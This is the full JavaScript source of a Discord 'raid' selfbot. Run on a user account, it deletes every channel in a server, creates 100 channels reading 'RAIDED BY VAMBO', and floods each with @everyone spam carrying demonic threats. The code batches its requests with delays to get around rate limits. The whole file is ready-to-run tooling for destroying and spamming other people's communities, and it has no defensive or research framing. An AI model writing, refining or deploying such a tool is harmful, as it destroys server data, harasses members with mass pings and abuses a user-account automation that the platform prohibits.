const { Client } = require('discord.js-selfbot-v13');
const client = new Client();

// Use environment variable for security
const TOKEN = process.env.DISCORD_TOKEN;
const PREFIX = '!';

// Web server for Railway
const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
    res.send('👹 SCARY RAID SELFBOT RUNNING 👹');
});

app.listen(PORT, () => {
    console.log(`Web server running on port ${PORT}`);
});

client.on('ready', () => {
    console.log(`👹 Logged in as ${client.user.tag}`);
    console.log(`👹 Selfbot ready in ${client.guilds.cache.size} servers`);
    console.log(`👹 Type !scary in any channel to unleash the demon`);
});

// Helper function to delay (ms)
const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

client.on('messageCreate', async (message) => {
    // Only respond to your own messages
    if (message.author.id !== client.user.id) return;
    if (!message.content.startsWith(PREFIX)) return;

    const args = message.content.slice(PREFIX.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    // ===== SCARY RAID COMMAND =====
    if (command === 'scary' || command === 'raid') {
        const guild = message.guild;
        const originalChannel = message.channel;
        
        if (!guild) {
            await originalChannel.send('This command only works in servers!');
            return;
        }

        console.log(`👹 STARTING SCARY RAID ON ${guild.name}`);
        
        // Send initial message (will be deleted soon anyway)
        await originalChannel.send('👹 **UNLEASHING THE DEMONS...**').catch(() => {});

        // ===== STEP 1: DELETE ALL CHANNELS (FASTER) =====
        let deletedCount = 0;
        
        // Get all channels (excluding the one we're in if it still exists)
        const channels = [...guild.channels.cache.values()];
        
        console.log(`👹 Deleting ${channels.length} channels...`);
        
        // Delete non-category channels first (faster, no waiting for categories)
        const nonCategoryChannels = channels.filter(c => c.type !== 'GUILD_CATEGORY');
        
        // Delete in parallel with Promise.all for SPEED (but with limits)
        const deleteBatch = async (channelList, batchSize = 5) => {
            for (let i = 0; i < channelList.length; i += batchSize) {
                const batch = channelList.slice(i, i + batchSize);
                await Promise.all(batch.map(async (channel) => {
                    try {
                        await channel.delete();
                        deletedCount++;
                        console.log(`✅ Deleted: ${channel.name}`);
                    } catch (e) {
                        // Ignore errors
                    }
                }));
                // Small delay between batches to avoid rate limits
                await delay(300);
            }
        };
        
        await deleteBatch(nonCategoryChannels);
        
        // Then delete categories
        const categoryChannels = channels.filter(c => c.type === 'GUILD_CATEGORY');
        await deleteBatch(categoryChannels);
        
        console.log(`✅ Deleted ${deletedCount} channels`);

        // ===== STEP 2: CREATE 100 SCARY CHANNELS (FASTER) =====
        console.log(`👹 Creating 100 SCARY channels...`);
        
        // SCARY CHANNEL NAME - REPLACE WITH YOUR GENERATED ZALGO TEXT!
        // Go to https://www.cooltext.app/ and generate cursed text for "RAIDED BY VAMBO"
        const channelName = 'R҉A҉I҉D҉E҉D҉ ҉B҉Y҉ ҉V҉A҉M҉B҉O҉'; // REPLACE THIS WITH YOUR GENERATED TEXT
        
        // SCARY MESSAGES - MIX OF CURSED TEXT AND SYMBOLS
        const scaryMessages = [
            // Message 1: Full cursed text with bold
            `@everyone @here **RAIDED BY VAMBO**\n\n### NEVER SCAM AGAIN SON😂\n            😯KICK ROCKS😯\nhttps://media.tenor.com/hWmpAzAlsm4AAAAM/ishowspeed-scary-speed.gif`,
            
            // Message 2: Demonic theme
            `@everyone @here 👹 **DEMON RISING** 👹\n\nYOUR SERVER IS **CURSED** FOREVER\n\nhttps://media.tenor.com/hWmpAzAlsm4AAAAM/ishowspeed-scary-speed.gif`,
            
            // Message 3: Glitch/Hacker theme
            `@everyone @here 💀 **SYSTEM CORRUPTED** 💀\n\n### 01001110 01000101 01010110 01000101 01010010 00100000 01000001 01000111 01000001 01001001 01001110\n\nhttps://media.tenor.com/hWmpAzAlsm4AAAAM/ishowspeed-scary-speed.gif`,
            
            // Message 4: Satanic/Pentagram theme
            `@everyone @here ⛧ **HAIL VAMBO** ⛧\n\n### 666 666 666\n\nhttps://media.tenor.com/hWmpAzAlsm4AAAAM/ishowspeed-scary-speed.gif`,
            
            // Message 5: Blood/Death theme
            `@everyone @here 🩸 **BLOOD SACRIFICE** 🩸\n\nTHIS SERVER IS **DEAD**\n\nhttps://media.tenor.com/hWmpAzAlsm4AAAAM/ishowspeed-scary-speed.gif`
        ];
        
        let createdCount = 0;

        // Create channels in batches for SPEED
        const createBatch = async (startIndex, batchSize = 5) => {
            const promises = [];
            
            for (let i = 0; i < batchSize && (startIndex + i) < 100; i++) {
                const channelIndex = startIndex + i + 1;
                promises.push((async () => {
                    try {
                        // Create channel
                        const newChannel = await guild.channels.create(`${channelName}-${channelIndex}`, {
                            type: 'text'
                        });
                        
                        // Pick random scary message
                        const randomMessage = scaryMessages[Math.floor(Math.random() * scaryMessages.length)];
                        
                        // Send message
                        await newChannel.send(randomMessage);
                        
                        createdCount++;
                        console.log(`✅ Created channel ${channelIndex}/100`);
                    } catch (e) {
                        console.log(`❌ Failed channel ${channelIndex}: ${e.message}`);
                    }
                })());
            }
            
            await Promise.all(promises);
        };

        // Create all 100 channels in batches
        for (let batchStart = 0; batchStart < 100; batchStart += 5) {
            await createBatch(batchStart);
            await delay(800); // Delay between batches to avoid rate limits
        }

        // ===== NO FINAL CHANNEL - JUST CONSOLE LOG =====
        console.log('='.repeat(50));
        console.log('👹 **SCARY RAID COMPLETE** 👹');
        console.log(`✅ Deleted: ${deletedCount} channels`);
        console.log(`✅ Created: ${createdCount} scary channels`);
        console.log('='.repeat(50));
    }
});

client.login(TOKEN);
